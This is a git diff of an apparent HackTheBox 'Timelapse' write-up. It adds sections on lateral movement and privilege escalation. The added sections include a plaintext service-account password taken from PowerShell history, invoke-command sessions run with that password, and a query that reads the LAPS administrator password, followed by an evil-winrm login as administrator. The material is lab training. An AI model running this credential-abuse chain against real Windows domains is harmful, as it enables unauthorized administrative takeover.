@@ -83,7 +83,7 @@ And we do the same to extract the certificate:
 openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacy.crt 
 ```
 
-After this we alter the files by removing the header so we are only left with the key itself. We can now continue by using the keys to connect to the target with ```evilwin-rm``` .
+After this we alter the files by removing the header so we are only left with the key itself. We can now continue by using the keys to connect to the target with ```evil-winrm``` .
 
 ```
 evil-winrm -S -k legacy.key -c legacy.crt -i 10.10.11.152
@@ -91,8 +91,45 @@ evil-winrm -S -k legacy.key -c legacy.crt -i 10.10.11.152
 
 <img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Timelapse/assets/8.png">
 
+# Lateral Movement
+We are unable to use ```winPEAS``` because Microsoft Defender is blocking the file. Using an obfuscated version didn't help either. After further enumerating the host for the usual ways for privilege escalation i was unable to find anything useful. I got some help pointing me in the right direction and found the Powershell history file:
+
+pic9
+
+We found the password for the ```svc_deploy``` account and can use this to run commands as the this user.
+
+```
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+
+invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
+```
+
+And we can check for privileges:
+```
+invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami /priv}
+
+invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}
+```
+
+pic10
+
+
 # Privilege Escalation
-[TO BE CONTINUED]
+We see that this user is member of the ```LAPS_Readers``` group which is useful to us because we can probably extract the local administrator password. We can check for this by using the ```AD-Module```.
+
+```
+invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}
+```
+
+pic11
+
+Now that we've found the password we can again use ```evil-winrm``` to connect to the target as ```administrator```.
+
+```
+evil-winrm -i 10.10.11.152 -u administrator -p '6yHTPR#s417Lo6/7kC{aP!WC' 
+```
 
 
 
